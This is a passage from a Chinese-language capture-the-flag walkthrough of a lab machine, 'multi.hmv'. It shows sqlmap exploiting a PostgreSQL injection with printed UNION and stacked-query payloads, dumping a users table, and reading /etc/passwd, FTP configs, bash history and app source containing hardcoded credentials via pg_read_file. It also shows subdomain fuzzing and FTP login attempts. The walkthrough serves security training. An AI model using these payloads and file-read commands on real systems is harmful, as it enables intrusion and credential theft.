for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:44:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:44:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:44:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:44:19] [INFO] target URL appears to have 3 columns in query
[03:44:19] [INFO] POST parameter 'keyword' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'keyword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: keyword (POST)
    Type: stacked queries
    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
    Payload: keyword=1';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr
---
[03:44:19] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:44:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'

[*] ending @ 03:44:19 /2025-07-22/

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sqlmap -r 1 --batch -D public -T users --dump                             
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:44:40 /2025-07-22/

[03:44:40] [INFO] parsing HTTP request from '1'
[03:44:40] [INFO] resuming back-end DBMS 'postgresql' 
[03:44:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: stacked queries
    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
    Payload: keyword=1';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr
---
[03:44:40] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:44:40] [INFO] fetching columns for table 'users' in database 'public'
[03:44:40] [WARNING] reflective value(s) found and filtering out
[03:44:40] [INFO] fetching entries for table 'users' in database 'public'
Database: public
Table: users
[4 entries]
+----+-----------------+----------+
| id | email           | username |
+----+-----------------+----------+
| 1  | admin@multi.hmv | admin    |
| 2  | guest@multi.hmv | guest    |
| 3  | test@multi.hmv  | test     |
| 4  | xiao@multi.hmv  | xiao     |
+----+-----------------+----------+

[03:44:40] [INFO] table 'public.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.205/dump/public/users.csv'
[03:44:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'

[*] ending @ 03:44:40 /2025-07-22/
```

ÊúâÂüüÂêçÔºåÂä†ÂüüÂêçÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo vim /etc/hosts                          
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ tail -n 1 /etc/hosts                                                                                                                          
192.168.205.205 multi.hmv 
                
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ wfuzz -c -u 'http://multi.hmv/' -H 'HOST:FUZZ.multi.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 933
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://multi.hmv/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================

000009532:   400        10 L     35 W       301 Ch      '#www - #www'                                                                                                    
000010581:   400        10 L     35 W       301 Ch      '#mail - #mail'                                                                                                  
000047706:   400        10 L     35 W       301 Ch      '#smtp - #smtp'                                                                                                  
000103135:   400        10 L     35 W       301 Ch      '#pop3 - #pop3'                                                                                                  

Total time: 68.80952
Processed Requests: 114442
```

ÁÑ∂ÂêéÈáçÊñ∞ÁàÜÁ†¥ÁõÆÂΩïÔºåÊ≤°ÊúâÊî∂Ëé∑

ÁùÄÈáçÊâíÊãâ‰∫Ü‰∏Ä‰∏ãsqlÔºåÂ§çÁé∞ÂèØ‰ª•ËØªÊñá‰ª∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:07 /2025-07-21/

[23:42:07] [INFO] parsing HTTP request from 'tmp/1'
[23:42:07] [INFO] resuming back-end DBMS 'postgresql' 
[23:42:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:42:07] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:42:07] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'
[23:42:07] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/passwd', 0, 1000000): 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nxiao:x:1001:1001::/home/xiao:/bin/bash\ntelnetd:x:106:113::/nonexistent:/usr/sbin/nologin\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\nftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nsecure_user:x:1002:1002::/home/secure_user:/bin/bash\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\nsamba_user:x:1003:1003::/home/samba_user:/bin/false\n_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin\npostgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\n'
[23:42:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:42:07 /2025-07-21/
```

- `xiao:x:1001:1001::/home/xiao:/bin/bash`
- `secure_user:x:1002:1002::/home/secure_user:/bin/bash`
- `todd:x:1000:1000:,,,:/home/todd:/bin/bash`

Â∞ùËØïËØªÂèñÂØÜÈí•ÔºåÂÖ®ÈÉΩÊ≤°ÊúâÊùÉÈôê

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:50:12 /2025-07-21/

[23:50:12] [INFO] parsing HTTP request from 'tmp/1'
[23:50:12] [INFO] resuming back-end DBMS 'postgresql' 
[23:50:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:50:12] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:50:12] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'
[23:50:12] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000): 'listen=NO\nlisten_ipv6=YES\nanonymous_enable=NO\nlocal_enable=YES\nwrite_enable=YES\nlocal_umask=022\ndirmessage_enable=YES\nuse_localtime=YES\nxferlog_enable=YES\nconnect_from_port_20=YES\nchroot_local_user=YES\nallow_writeable_chroot=YES\nsecure_chroot_dir=/var/run/vsftpd/empty\npam_service_name=vsftpd\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nssl_enable=YES\nallow_anon_ssl=NO\nforce_local_data_ssl=YES\nforce_local_logins_ssl=YES\nssl_tlsv1=YES\nssl_sslv2=NO\nssl_sslv3=NO\nrequire_ssl_reuse=NO\nssl_ciphers=HIGH\npasv_min_port=50000\npasv_max_port=50050\nuserlist_enable=YES\nuserlist_file=/etc/vsftpd.userlist\nuserlist_deny=NO\n'
[23:50:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:50:12 /2025-07-21/

```

vsftpdÂÖ∂‰∏≠ÈáçÁÇπÁöÑ‰∏úË•ø

&gt; listen=NO
&gt; listen_ipv6=YES
&gt; anonymous_enable=NO     # ‰∏çÂÖÅËÆ∏ÂåøÂêçÁôªÂΩïÔºåËøôÂíåÊàë‰ª¨‰πãÂâçÁöÑÊµãËØïÁªìÊûú‰∏ÄËá¥
&gt; local_enable=YES        # ÂÖÅËÆ∏Êú¨Âú∞Áî®Êà∑ÁôªÂΩïÔºåËøôÊòØÂÖ≥ÈîÆ
&gt; write_enable=YES        # ÂÖÅËÆ∏ÂÜôÂÖ•ÔºÅËøôÊòØÂè¶‰∏Ä‰∏™ÂÖ≥ÈîÆ
&gt; ...
&gt; chroot_local_user=YES   # Â∞ÜÁî®Êà∑ÈôêÂà∂Âú®Ëá™Â∑±ÁöÑÂÆ∂ÁõÆÂΩï‰∏≠
&gt; allow_writeable_chroot=YES # ÂÖÅËÆ∏ÂÆ∂ÁõÆÂΩïÂèØÂÜôÔºàËøôÊòØ‰∏Ä‰∏™‰∏çÂÆâÂÖ®ÁöÑÈÖçÁΩÆÔºåÈÄöÂ∏∏ÈúÄË¶ÅÈÅøÂÖçÔºâ
&gt; ...
&gt; pam_service_name=vsftpd
&gt; ...
&gt; userlist_enable=YES      # &lt;-- ÔºÅÔºÅÔºÅ ÂºÄÂêØ‰∫ÜÁî®Êà∑ÂàóË°®ÂäüËÉΩ
&gt; userlist_file=/etc/vsftpd.userlist # &lt;-- ÔºÅÔºÅÔºÅ ÊåáÂÆö‰∫ÜÁî®Êà∑ÂàóË°®Êñá‰ª∂
&gt; userlist_deny=NO         # &lt;-- ÔºÅÔºÅÔºÅ ËøôÊòØÂÜ≥ÂÆöÊÄßÁöÑ‰∏ÄÂáªÔºÅ

ÊâíÊãâ‰ªñÁî®Êà∑ÂàóË°®Êñá‰ª∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:51:25 /2025-07-21/

[23:51:25] [INFO] parsing HTTP request from 'tmp/1'
[23:51:25] [INFO] resuming back-end DBMS 'postgresql' 
[23:51:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:51:25] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:51:25] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'
[23:51:25] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000): 'secure_user\n'
[23:51:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:51:25 /2025-07-21/
```

Âè™Êúâ **secure_user** Ëøô‰∏Ä‰∏™Áî®Êà∑Ë¢´ÊéàÊùÉÂèØ‰ª•ÈÄöËøá FTP ÊúçÂä°ËøõË°åÁôªÂΩïÂ∞ùËØï

Êàë‰ª¨ËøõË°åÁôªÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): secure_user
530 Non-anonymous sessions must use encryption.
ftp: Login failed
ftp&gt; exit
```

Âè´Êàë‰ª¨Âä†ÂØÜ‰ºöËØùÔºåÊâÄ‰ª•Êç¢lftp

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ lftp -u secure_user 192.168.205.205
ÂØÜÁ†Å: secure_user
lftp secure_user@192.168.205.205:~&gt; ls                
ls: ‰∏•ÈáçÈîôËØØ: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (71:24:67:D0:3C:52:A2:8F:AF:8F:11:F9:D1:D7:19:08:A1:20:35:49)
```

Á¶ÅÁî®ËØÅ‰π¶

```bash
lftp secure_user@192.168.205.205:~&gt; set ssl:verify-certificate no
lftp secure_user@192.168.205.205:~&gt; ls
ls: ÁôªÂΩïÂ§±Ë¥•: 530 Login incorrect.       
```

ÂØÜÁ†ÅÊòØÈîôÁöÑÔºåÂêéÈù¢Â∞ùËØï‰∫ÜÁàÜÁ†¥ÔºåÊ≤°ÊúâÊî∂Ëé∑ÔºåÂ∞±ÂõûÂéªÁúãsql‰∫Ü

Êü•ÁúãSQLÊùÉÈôê

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT current_user'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:11:48 /2025-07-22/

[00:11:48] [INFO] parsing HTTP request from 'tmp/1'
[00:11:48] [INFO] resuming back-end DBMS 'postgresql' 
[00:11:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:11:48] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:11:48] [INFO] fetching SQL SELECT statement query output: 'SELECT current_user'
[00:11:48] [WARNING] reflective value(s) found and filtering out
SELECT current_user: 'dvuser'
[00:11:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:11:48 /2025-07-22/
```

ËØªÂèñ‰∏Ä‰∏ã‰ªñÁöÑÂëΩ‰ª§ÂéÜÂè≤ËÆ∞ÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:13:37 /2025-07-22/

[00:13:37] [INFO] parsing HTTP request from 'tmp/1'
[00:13:37] [INFO] resuming back-end DBMS 'postgresql' 
[00:13:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:13:37] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:13:37] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'
[00:13:37] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000): 'geAbgWpouT=xBcZHwGxAX KOxuJqpGxZ=KEqNdLkFrf;printf $geAbgWpouT$KOxuJqpGxZ;echo $$;printf $KOxuJqpGxZ$geAbgWpouT\n hSAkQvpQLQ=lTHFyQbFqh nSpdwixuov=CqlpNdGWDg;printf $hSAkQvpQLQ$nSpdwixuov;echo '$(id -un)($(id -u))';printf $nSpdwixuov$hSAkQvpQLQ\n SNBrffgiiZ=ELTGdWlbkd ranIeerCgZ=dhqaYbOtwr;printf $SNBrffgiiZ$ranIeerCgZ;tty;printf $ranIeerCgZ$SNBrffgiiZ\ncd /home\nfind \ncd /usr/local/bin\nls -la\ncat custom_login \ncat /etc/default/telnet\necho 'ENABLE_BACKDOOR' &gt; /etc/default/telnet\ncd /var/www/html/\nls -la\ncd pub/\nls -la\ntouch a\ncd /home\ncd /opt\nls\ncat app.py \ncd /srv\nls -la\nfind\nls -la\ncd secure_share/\n'
[00:13:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 00:13:37 /2025-07-22/
```

&gt;... (‰∏Ä‰∫õÊ∑∑Ê∑ÜËßÜÂê¨ÁöÑÂëΩ‰ª§) ...
&gt;
&gt;cd /opt          # &lt;-- ‰ªñËøõÂÖ•‰∫Ü /opt ÁõÆÂΩï
&gt;ls
&gt;cat app.py       # &lt;-- ÔºÅÔºÅÔºÅ‰ªñÊü•Áúã‰∫Ü‰∏Ä‰∏™Âè´ÂÅö app.py ÁöÑÊñá‰ª∂ÔºÅ
&gt;cd /srv
&gt;ls -la
&gt;find
&gt;ls -la
&gt;cd secure_share/ # &lt;-- Ëøô‰∏™ÂÖ±‰∫´ÁõÆÂΩïÊàë‰ª¨‰πãÂâçËßÅËøá

ÂéªÁúãÁúãapp.pyÁöÑÊ∫êÁ†Å

```bash
‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:14:51 /2025-07-22/

[00:14:51] [INFO] parsing HTTP request from 'tmp/1'
[00:14:51] [INFO] resuming back-end DBMS 'postgresql' 
[00:14:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[00:14:51] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[00:14:51] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'
[00:14:51] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/opt/app.py', 0, 1000000): 'from flask import Flask, request, render_template_string, redirect, session\nimport psycopg2\n\napp = Flask(__name__)\napp.secret_key = 's3cret_key'\n\n# Database connection\nconn = psycopg2.connect(\n    dbname='dvtest',\n    user='dvuser',\n    password='dvpass',\n    host='localhost',\n    port='5432'\n)\n\n# HTML template with search form\nTEMPLATE = '''\n&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Admin Panel&lt;/title&gt;\n    &lt;style&gt;\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        table { border-collapse: collapse; width: 100%; }\n        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n        th { background-color: #f2f2f2; }\n        .error { color: red; }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h2&gt;Welcome{% if user %}, {{ user }}{% endif %}&lt;/h2&gt;\n    {% if not user %}\n        &lt;form method='POST' action='/'&gt;\n            Username: &lt;input name='username' required&gt;\n            &lt;input type='submit' value='Login'&gt;\n        &lt;/form&gt;\n    {% else %}\n        &lt;p&gt;&lt;a href='/search'&gt;User Search&lt;/a&gt; | &lt;a href='/logout'&gt;Logout&lt;/a&gt;&lt;/p&gt;\n        &lt;form method='POST' action='/search'&gt;\n            Search User: &lt;input name='keyword' 